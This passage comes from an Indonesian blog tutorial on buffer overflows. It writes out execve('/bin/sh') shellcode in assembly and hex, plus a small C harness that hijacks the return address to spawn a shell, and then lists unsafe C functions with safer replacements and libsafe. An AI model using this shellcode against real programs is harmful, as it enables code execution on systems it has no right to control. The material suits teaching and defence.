+<td width="163" valign="top">Alamat cmd[1]</td>
+<td width="107" valign="top">Cmd[1]</td>
+<td width="97" valign="top"></td>
+<td width="144" valign="top">NULL</td>
+</tr>
+</tbody>
+</table>
+<p class="inline-ad-slot" id="inline-ad-15" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true" align="center">&nbsp;<em></em></p>
+<p data-adtags-visited="true" align="center"><em>Gambar 4. Argumen dari system call execve()</em></p>
+<p data-adtags-visited="true">Langkah diatas selanjutnya harus diimplementasikan ke dalam kode assembly sebagai berikut :</p>
+<p data-adtags-visited="true"># shellcode.c</p>
+<p data-adtags-visited="true">#include &lt;stdio.h&gt;</p>
+<p data-adtags-visited="true">int main ()</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">_asm_(“</p>
+<p data-adtags-visited="true">jmp&nbsp; ekor</p>
+<p data-adtags-visited="true">kepala:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl %esi</p>
+<p data-adtags-visited="true">movl %esi,0x8(%esi)</p>
+<p data-adtags-visited="true">movl $0x0,0xc(%esi)</p>
+<p data-adtags-visited="true">movl $0xb,%eax</p>
+<p data-adtags-visited="true">movl %esi,%ebx</p>
+<p data-adtags-visited="true">leal 0x8(%esi),%ecx</p>
+<p data-adtags-visited="true">leal 0xc(%esi),%edx</p>
+<p class="inline-ad-slot" id="inline-ad-16" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">int&nbsp; $0x80</p>
+<p data-adtags-visited="true">ekor:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call kepala</p>
+<p data-adtags-visited="true">.string\”/bin/sh\”</p>
+<p data-adtags-visited="true">“);</p>
+<p data-adtags-visited="true">return 0;</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">Instruksi jmp dan call di atas digunakan 
+agar alamat string “/bin/sh” disalinkan ke stack sebagai RET setelah 
+instruksi call dieksekusi. Dengan demikian alamat string dapat dengan 
+mudah ditentukan.</p>
+<p data-adtags-visited="true">Program diatas jika dieksekusi akan 
+menghasilkan kesalahan, hal ini diakibatkan halaman kode pada sistem 
+operasi Linux hanya boleh di baca saja, dan tidak boleh di modifikasi 
+sendiri.</p>
+<p data-adtags-visited="true">Untuk menguji program diatas maka harus 
+dikonversikan ke bentuk heksadesimal terlebih dahulu. Hal ini dapat 
+dilakukan dengan program gdb, tepatnya dengan instruksi x/bx.</p>
+<p data-adtags-visited="true">$ gdb shellcode</p>
+<p data-adtags-visited="true">(gdb) disassemble main</p>
+<p data-adtags-visited="true">Dump of assembler code for function main :</p>
+<p data-adtags-visited="true">Ox80483e0 &lt;main&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : push %ebp</p>
+<p data-adtags-visited="true">Ox80483e1 &lt;main+1&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : move %esp,%ebp</p>
+<p class="inline-ad-slot" id="inline-ad-17" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Ox80483e3 &lt;main+3&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : jmp&nbsp; 0x80483fe&lt;ekor&gt;</p>
+<p data-adtags-visited="true">……</p>
+<p data-adtags-visited="true">(gdb) x/bx main+3</p>
+<p data-adtags-visited="true">0x80483e4 &lt;main+3&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0xeb (gdb) &lt;ENTER&gt;</p>
+<p data-adtags-visited="true">0x80483e4 &lt;main+4&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0x19 (gdb) &lt;ENTER&gt;</p>
+<p data-adtags-visited="true">0x80483e5 &lt;kepala&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0x5e</p>
+<p data-adtags-visited="true">……….</p>
+<p data-adtags-visited="true">Hasil konversi instruksi assembly ke data heksadesimal adalah seperti berikut :</p>
+<p data-adtags-visited="true">\xeb\x1a\x5e\x89\x76\x08\xc7\x46\x0c\&nbsp;&nbsp;
+ 
+x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xc0\&nbsp;&nbsp;
+ xeb\x00\x89\xec\x5d\xc3</p>
+<p data-adtags-visited="true">Untuk mencoba bahwa instruksi yang sudah 
+dikerjakan berfungsi, perlu dibuat program kecil untuk mengeksekusi data
+ hasil konversi diatas :</p>
+<p data-adtags-visited="true"># test-shellcode.c</p>
+<p data-adtags-visited="true">#include&lt;stdio.h&gt;</p>
+<p data-adtags-visited="true">char shellcode []=</p>
+<p data-adtags-visited="true">“\xeb\x1a\x5e\x89\x76\x08\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00”</p>
+<p data-adtags-visited="true">“\x00\x00\x89\xf3\x8d\x4e\x08\x8d\&nbsp; x56\&nbsp; x0c\&nbsp; xcd\&nbsp; x80\xe8\xe1\xff\xff”</p>
+<p class="inline-ad-slot" id="inline-ad-18" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">“\xff\x2f\x62\x69\x6e\&nbsp; x2f\x73\x68\&nbsp; x00\&nbsp; x31\&nbsp; xc0\&nbsp; xeb\&nbsp; x00\ x89\ xec\ x5d\xc3”;</p>
+<p data-adtags-visited="true">int main()</p>
+<p data-adtags-visited="true">{</p>
+<p data-adtags-visited="true">int* ret;</p>
+<p data-adtags-visited="true">ret=(int*)&amp;ret+2;</p>
+<p data-adtags-visited="true">(*ret) = (int)shellcode;</p>
+<p data-adtags-visited="true">return 0;</p>
+<p data-adtags-visited="true">}</p>
+<p data-adtags-visited="true">Setelah dikompilasi dan dieksekusi, maka 
+pada monitor terlihat tampilan shell yang menunjukkan bahwa instruksi 
+yang ditulis berfungsi.</p>
+<p data-adtags-visited="true">$ gcc&nbsp; -o test-shellcode test-shellcode.c</p>
+<p data-adtags-visited="true">$ ./test-shellcode</p>
+<p data-adtags-visited="true">sh-2.05$</p>
+<p data-adtags-visited="true">Pada proses eksploitasi, maka instruksi 
+dalam bentuk heksadesimal diatas akan dilewatkan ke parameter fungsi 
+yang mempunyai buffer yang dapat di-overflow. Tentu saja instruksinya 
+masih harus dimodifikasi sedikit, sehingga nilai RET akan termodifikasi 
+dan mereferensi ke instruksi awal data di atas (tepatnya dalam hal in 
+instruksi JMP)</p>
+<h5>Mencegah Buffer Overflow</h5>
+<p class="inline-ad-slot" id="inline-ad-19" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:648px;" data-adtags-width="648" data-adtags-visited="true"></p><p data-adtags-visited="true">Ada
+ sebuah ungkapan yang bagus sekali “mencegah lebih baik daripada 
+mengobati”. Hal yang sama berlaku juga pada buffer overflow. Mencegah 
+buffer overflow jauh lebih baik dari pada memperbaikinya. Namun adalah 
+lebih mudah mengatakan daripada melakukannya, terlebih lagi bila 
+menggunakan bahasa pemrograman C. Hal ini disebabkan karena :</p>
+<ol>
+<li>C tidak memeriksa batasan array dan referensi pointer secara otomatis</li>
+<li>Banyak fungsi-fungsi yang disediakan oleh library standar C yang tidak aman</li>
+</ol>
+<p>Namun demikian, keadaan tersebut tidak mengurangi riset-riset yang 
+dilakukan untuk mencegah terjadinya buffer overflow. Berikut ini 
+beberapa metoda yang digunakan untuk mencegah buffer overflow]:</p>
+<table cellspacing="0" cellpadding="0" border="1">
+<tbody>
+<tr>
+<td width="180" valign="top">
+<h4>Keterangan</h4>
+</td>
+<td width="168" valign="top"><strong>Nama Fungsi</strong></td>
+<td width="180" valign="top"><strong>Alternatif Solusi</strong></td>
+</tr>
+<tr>
+<td width="180" valign="top">Membaca sebuah baris dari stdin ke buffer</td>
+<td width="168" valign="top">Gets (char *s)</td>
+<td width="180" valign="top">Menggunakan fgets (char&nbsp; *s, int size, FILE&nbsp; *stream)</td>
+</tr>
+<tr>
+<td width="180" valign="top">Menyalinkan string sember ke sebuah buffer</td>
+<td width="168" valign="top">Strcpy (char&nbsp; *dest, const char&nbsp; *src)</td>
+<td width="180" valign="top">Gunakan strncpy (char *dest, const char&nbsp; *scr, size_t&nbsp; n)</td>
+</tr>
+<tr>
+<td width="180" valign="top">Menambahkan sebuah string ke string lain</td>
+<td width="168" valign="top">Strcat (char&nbsp; *dest, const char&nbsp; *src)</td>
+<td width="180" valign="top">Gunakan strncat (char&nbsp; *dest, const char&nbsp; *src, size_t n)</td>
+</tr>
+<tr>
+<td width="180" valign="top">Mencetak output berdasarkan suatu format string</td>
+<td width="168" valign="top">Sprintf (char&nbsp; *str, const char&nbsp; *format……)</td>
+<td width="180" valign="top">Gunakan snprintf (char&nbsp; *str, size_t size, const char&nbsp; *format,…..)</td>
+</tr>
+<tr>
+<td width="180" valign="top">Membaca input dari stream pointer sesuai dengan format tertentu</td>
+<td width="168" valign="top">Fscanf (FILE *stream, const char &nbsp;*format, ……..)</td>
+<td width="180" valign="top">Gunakan precision specifer</td>
+</tr>
+<tr>
+<td width="180" valign="top">Membaca input dan stream pointer sesuai dengan format tertentu</td>
+<td width="168" valign="top">Fscanf (FILE *stream, const char&nbsp; *format,…….)</td>
+<td width="180" valign="top">Gunakan precision specifer</td>
+</tr>
+<tr>
+<td width="180" valign="top">Mengembalikan nama path absolut</td>
+<td width="168" valign="top">Realpath (const char *path, char *resolved_path)</td>
+<td width="180" valign="top">Alokasikan buffer sebesar MAXPATHLEN, serta
+ periksa juga argumen untuk memastikan bahwa argumen input tidak lebih 
+panjang daripada MAXPATHLEN</td>
+</tr>
+<tr>
+<td width="180" valign="top">Memparsing option perintah baris</td>
+<td width="168" valign="top">Getopt_log (int argc, char&nbsp; * const argv [ ], const char *optstring, const struct option&nbsp; *longopts, int *longindex)</td>
+<td width="180" valign="top">Potong semua input string agar berukuran cukup sebelum memberikannya ke fungsi ini</td>
+</tr>
+</tbody>
+</table>
+<p>Melakukan pemrograman yang baik adalah sebuah tugas yang sulit, 
+terlebih lagi bila program tersebut di tulis dengan bahasa C. Berikut 
+adalah beberapa hal yang disarankan dalam melakukan pemrograman dengan 
+bahasa C.</p>
+<p>Penggunaan fungsi standar C yang lebih aman. Beberapa fungsi standar C
+ seharusnya dihindari, karena mereka tidak melakukan pengecekan terhadap
+ panjang string yang dimasukkan. Berikut ini adalah beberapa buah fungsi
+ standar C umum yang tidak aman beserta alternatif solusinya:</p>
+<p>Salah satu program yang menggunakan metoda ini adalah <em>libsafe</em>. <em>Libsafe </em>akan
+ mencegah semua panggilan ke fungsi-fungsi yang diketahui tidak aman, 
+kemudian ia akan menggantikannya dengan fungsi-fungsi serupa dengan yang
+ awal namun memiliki fasilitas untuk memastikan bahwa semua <em>buffer overflow</em> berada di dalam <em>stack frame</em> yang aktif.</p>
+<p>Sumber :</p>
+<p>CERT. <a href="http://www.cert.org/">http://www.cert.org/</a></p>
+<p>Crispin Cowan, et.al., “Buffer Overflows: Attacks and Defense for Vulerability of Decade”. 2000.</p>
+<p>Frederic Raynal, Christophe Blaess, Christophe Grenier, “Avoiding 
+Security Hole When Developing an Application : Part 2”, LinuxFocus,2001</p>
+<p>Gary McGraw dan John Viega, “Preventing Buffer Overflows”,</p>
+<p><a href="http://www-4.ibm.com/software/developer/library/overflows/index.html,2000" rel="nofollow">http://www-4.ibm.com/software/developer/library/overflows/index.html,2000</a>.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<div id="atatags-370373-5ef20a3307f3a">
+        <script type="text/javascript">
+            __ATA.cmd.push(function() {
+                __ATA.initVideoSlot('atatags-370373-5ef20a3307f3a', {
+                    sectionId: '370373',
+                    format: 'inread'
+                });
+            });
+        </script>
+    </div>			<div id="atatags-26942-5ef20a3307fce" data-adtags-width="648"></div>
+			
+			<script>
+				__ATA.cmd.push(function() {
+					__ATA.initDynamicSlot({
+						id: 'atatags-26942-5ef20a3307fce',
+						location: 120,
+						formFactor: '001',
+						label: {
+							text: 'Iklan',
+						},
+						creative: {
+							reportAd: {
+								text: 'Laporkan iklan ini',
+							},
+							privacySettings: {
+								text: 'Pengaturan privasi',
+							}
+						}
+					});
+				});
+			</script><div id="jp-post-flair" class="sharedaddy sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-56" class="share-twitter sd-button share-icon" href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/?share=twitter&amp;nb=1" target="_blank" title="Klik untuk berbagi pada Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-56" class="share-facebook sd-button share-icon" href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/?share=facebook&amp;nb=1" target="_blank" title="Klik untuk membagikan di Facebook"><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-loaded" id="like-post-wrapper-24419661-56-5ef20a33092a6" data-src="//widgets.wp.com/likes/index.html?ver=20190321#blog_id=24419661&amp;post_id=56&amp;origin=sholeh012.wordpress.com&amp;obj_id=24419661-56-5ef20a33092a6" data-name="like-post-frame-24419661-56-5ef20a33092a6"><h3 class="sd-title">Menyukai ini:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px; display: none;"><span class="button"><span>Suka</span></span> <span class="loading">Memuat...</span></div><iframe class="post-likes-widget jetpack-likes-widget" name="like-post-frame-24419661-56-5ef20a33092a6" src="Buffer%20OverFlow%20|%20sholeh012_files/index.html" width="100%" height="55px" frameborder="0"></iframe><span class="sd-text-color"></span><a class="sd-link-color"></a></div></div>														</div>
+
+		<!-- You can start editing here. -->
+			<!-- If comments are open, but there are no comments. -->
+	
+<div id="respondcon">
+		<div id="respond" class="comment-respond js">
+		<h3 id="reply-title" class="comment-reply-title">Tinggalkan Balasan <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://sholeh012.wordpress.com/2011/11/07/buffer-overflow/#respond" style="display:none;">Batalkan balasan</a></small></h3><form action="https://sholeh012.wordpress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form"><input type="hidden" id="highlander_comment_nonce" name="highlander_comment_nonce" value="7d16ba7dc1"><input type="hidden" name="_wp_http_referer" value="/2011/11/07/buffer-overflow/">
+<input type="hidden" name="hc_post_as" id="hc_post_as" value="guest">
+
+<div class="comment-form-field comment-textarea">
+	
+	<div id="comment-form-comment"><textarea aria-hidden="true" tabindex="-1" style="position: absolute; inset: -999px auto auto 0px; border: 0px none; padding: 0px; box-sizing: content-box; overflow-wrap: break-word; height: 0px !important; min-height: 0px !important; overflow: hidden; transition: none 0s ease 0s; font-family: Arial, Helvetica, Tahoma, Verdana, sans-serif; font-size: 14px; font-weight: 400; font-style: normal; letter-spacing: 0px; text-transform: none; text-decoration: rgba(0, 0, 0, 0.7); word-spacing: 0px; text-indent: 0px; line-height: normal; width: 626px;" class="autosizejs ">Ketikkan komentar di sini...</textarea><textarea id="comment" name="comment" title="Ketikkan komentar di sini..." placeholder="Ketikkan komentar di sini..." style="height: 36px; overflow: hidden; overflow-wrap: break-word; resize: none;"></textarea></div>
+</div>
+
+<div id="comment-form-identity" style="display: none;">
+	<div id="comment-form-nascar">
+		<p>Isikan data di bawah atau klik salah satu ikon untuk log in:</p>
+		<ul>
+			<li class="selected" style="display:none;">
+				<a href="#comment-form-guest" id="postas-guest" class="nascar-signin-link" title="Login via Tamu">
+									</a>
+			</li>
+			<li>
+				<a href="#comment-form-load-service:WordPress.com" id="postas-wordpress" class="nascar-signin-link" title="Login via WordPress.com">
+					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#0087be" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"></path></g></svg>				</a>
+			</li>
+			<li>
+			<iframe id="googleplus-sign-in" name="googleplus-sign-in" src="Buffer%20OverFlow%20|%20sholeh012_files/a.html" scrolling="no" allowtransparency="true" seamless="seamless" width="24" height="24" frameborder="0"></iframe>
+			</li>
+			<li>
+				<a href="#comment-form-load-service:Twitter" id="postas-twitter" class="nascar-signin-link" title="Login via Twitter">
+					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#1DA1F2" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"></path></g></svg>				</a>
+			</li>
+			<li>
+				<a href="#comment-form-load-service:Facebook" id="postas-facebook" class="nascar-signin-link" title="Login via Facebook">
+					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#3B5998" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"></path></g></svg>				</a>
+			</li>
+		</ul>
+	</div>
+
+	<div id="comment-form-guest" class="comment-form-service selected">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+<a href="https://gravatar.com/site/signup/" target="_blank">				<img src="Buffer%20OverFlow%20|%20sholeh012_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Gravatar" class="no-grav grav-hashed" id="grav-ad516503a11cd5ca435acc9bb6523536-0" width="25">
+</a>			</div>
+
+				<div class="comment-form-fields">
+				<div class="comment-form-field comment-form-email">
+					<label for="email">Email <span class="required">(wajib)</span> <span class="nopublish">(Alamat takkan pernah dipublikasikan)</span></label>
+					<div class="comment-form-input"><input id="email" name="email" type="email"></div>
+				</div>
+				<div class="comment-form-field comment-form-author">
+					<label for="author">Nama <span class="required">(wajib)</span></label>
+					<div class="comment-form-input"><input id="author" name="author" type="text"></div>
+				</div>
+				<div class="comment-form-field comment-form-url">
+					<label for="url">Situs Web</label>
+					<div class="comment-form-input"><input id="url" name="url" type="url"></div>
+				</div>
+			</div>
+			
+		</div>
+	</div>
+
+	<div id="comment-form-wordpress" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="Buffer%20OverFlow%20|%20sholeh012_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Logo WordPress.com" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-1" width="25">
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="wp_avatar" id="wordpress-avatar" class="comment-meta-wordpress" value="">
+				<input type="hidden" name="wp_user_id" id="wordpress-user_id" class="comment-meta-wordpress" value="">
+				<input type="hidden" name="wp_access_token" id="wordpress-access_token" class="comment-meta-wordpress" value="">
+						<p class="comment-form-posting-as pa-wordpress">
+			<strong></strong>
+			You are commenting using your WordPress.com account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'wordpress' );">Logout</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Ubah</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#0087be" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"></path></g></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+	<div id="comment-form-googleplus" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="Buffer%20OverFlow%20|%20sholeh012_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Foto Google" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-2" width="25">
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="googleplus_avatar" id="googleplus-avatar" class="comment-meta-googleplus" value="">
+				<input type="hidden" name="googleplus_user_id" id="googleplus-user_id" class="comment-meta-googleplus" value="">
+				<input type="hidden" name="googleplus_access_token" id="googleplus-access_token" class="comment-meta-googleplus" value="">
+						<p class="comment-form-posting-as pa-googleplus">
+			<strong></strong>
+			You are commenting using your Google account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'googleplus' );">Logout</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Ubah</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" x="0px" y="0px" viewBox="0 0 60 60"><path fill="#519bf7" d="M56.3,30c0,-1.6 -0.2,-3.4 -0.6,-5h-3.1H42.2H30v10.6h14.8C44,39.3 42,42 39.1,43.9l8.8,6.8C53,46 56.3,39 56.3,30z"></path><path fill="#3db366" d="M30,57.5c6.7,0 13.1,-2.4 17.9,-6.8l-8.8,-6.8c-2.5,1.6 -5.6,2.4 -9.1,2.4c-7.2,0 -13.3,-4.7 -15.4,-11.2l-9.3,7.1C9.8,51.3 19.1,57.5 30,57.5z"></path><path fill="#fdc600" d="M5.3,42.2l9.3,-7.1c-0.5,-1.6 -0.8,-3.3 -0.8,-5.1s0.3,-3.5 0.8,-5.1l-9.3,-7.1C3.5,21.5 2.5,25.6 2.5,30S3.5,38.5 5.3,42.2z"></path><path fill="#f15b44" d="M40.1,17.4l8,-8C43.3,5.1 37,2.5 30,2.5C19.1,2.5 9.8,8.7 5.3,17.8l9.3,7.1c2.1,-6.5 8.2,-11.1 15.4,-11.1C33.9,13.7 37.4,15.1 40.1,17.4z"></path></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+	<div id="comment-form-twitter" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="Buffer%20OverFlow%20|%20sholeh012_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Gambar Twitter" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-3" width="25">
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="twitter_avatar" id="twitter-avatar" class="comment-meta-twitter" value="">
+				<input type="hidden" name="twitter_user_id" id="twitter-user_id" class="comment-meta-twitter" value="">
+				<input type="hidden" name="twitter_access_token" id="twitter-access_token" class="comment-meta-twitter" value="">
+						<p class="comment-form-posting-as pa-twitter">
+			<strong></strong>
+			You are commenting using your Twitter account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'twitter' );">Logout</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Ubah</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#1DA1F2" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"></path></g></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+	<div id="comment-form-facebook" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="Buffer%20OverFlow%20|%20sholeh012_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Foto Facebook" class="no-grav grav-hashed grav-hijack" id="grav-ad516503a11cd5ca435acc9bb6523536-4" width="25">
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="fb_avatar" id="facebook-avatar" class="comment-meta-facebook" value="">
+				<input type="hidden" name="fb_user_id" id="facebook-user_id" class="comment-meta-facebook" value="">
+				<input type="hidden" name="fb_access_token" id="facebook-access_token" class="comment-meta-facebook" value="">
+						<p class="comment-form-posting-as pa-facebook">
+			<strong></strong>
+			You are commenting using your Facebook account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'facebook' );">Logout</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Ubah</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#3B5998" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"></path></g></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+
+	<div id="comment-form-load-service" class="comment-form-service">
